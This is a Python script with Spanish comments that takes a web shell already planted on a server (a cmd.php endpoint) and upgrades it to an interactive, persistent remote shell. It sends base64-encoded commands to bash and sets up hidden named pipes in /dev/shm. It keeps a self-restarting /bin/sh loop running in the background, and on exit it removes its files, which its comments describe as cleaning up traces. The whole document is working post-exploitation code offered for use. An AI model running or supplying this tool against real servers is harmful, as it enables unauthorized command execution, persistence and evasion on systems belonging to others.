#!/usr/bin/python3

import requests
import time
import threading
import signal
import sys
import base64
from random import randrange

# --- Configuración Avanzada ---
class Config:
    URL = "http://localhost/cmd.php"
    SESS_ID = randrange(1000, 9999)
    # Usamos un prefijo para identificar nuestros archivos fácilmente
    REMOTE_IN = f"/dev/shm/.input_{SESS_ID}"
    REMOTE_OUT = f"/dev/shm/.output_{SESS_ID}"
    INTERVAL = 0.6  # Reducido para mayor fluidez
    HEADERS = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
    }

# --- Lógica de Comunicación ---
def b64_cmd(cmd):
    return base64.b64encode(cmd.encode()).decode()

def send_raw_command(full_command):
    """Envía el comando final al servidor y maneja errores de red."""
    try:
        data = {'cmd': f'echo {b64_cmd(full_command)} | base64 -d | bash'}
        r = requests.post(Config.URL, data=data, headers=Config.HEADERS, timeout=10)
        return r.text.strip()
    except requests.exceptions.RequestException as e:
        return f"[!] Connection Error: {e}"

# --- Gestión de la Shell ---
class ShellManager:
    def __init__(self):
        self.stop_threads = False

    def setup(self):
        print(f"[*] Iniciando sesión {Config.SESS_ID}...")
        # Creamos las pipes y lanzamos el proceso persistente
        # Usamos un loop while para que si la shell muere, se reinicie automáticamente
        setup_cmd = (
            f"mkfifo {Config.REMOTE_IN} {Config.REMOTE_OUT}; "
            f"while true; do /bin/sh < {Config.REMOTE_IN} > {Config.REMOTE_OUT} 2>&1; done &"
        )
        send_raw_command(setup_cmd)

    def cleanup(self):
        print("\n[*] Limpiando rastro y saliendo...")
        self.stop_threads = True
        cleanup_cmd = f"rm -f {Config.REMOTE_IN} {Config.REMOTE_OUT} && fg %1; kill $!"
        send_raw_command(cleanup_cmd)
        sys.exit(0)

    def reader_loop(self):
        """Lee el output de forma inteligente."""
        # Comando para leer y vaciar el buffer sin borrar el archivo (más estable)
        read_and_empty = f"cat {Config.REMOTE_OUT} && true > {Config.REMOTE_OUT}"
        
        while not self.stop_threads:
            output = send_raw_command(read_and_empty)
            if output:
                print(output, end="", flush=True)
            time.sleep(Config.INTERVAL)

    def write(self, command):
        """Escribe en la pipe de entrada."""
        write_cmd = f"echo {b64_cmd(command + ' \n')} | base64 -d > {Config.REMOTE_IN}"
        send_raw_command(write_cmd)

# --- Ejecución ---
shell = ShellManager()

def signal_handler(sig, frame):
    shell.cleanup()

signal.signal(signal.SIGINT, signal_handler)

if __name__ == "__main__":
    shell.setup()
    
    # Hilo de lectura
    t = threading.Thread(target=shell.reader_loop)
    t.daemon = True
    t.start()

    print("[+] Shell establecida. Escribe 'exit' para terminar.")
    
    try:
        while True:
            cmd = input()
            if cmd.lower() in ["exit", "quit"]:
                break
            shell.write(cmd)
    except EOFError:
        pass
    
    shell.cleanup()
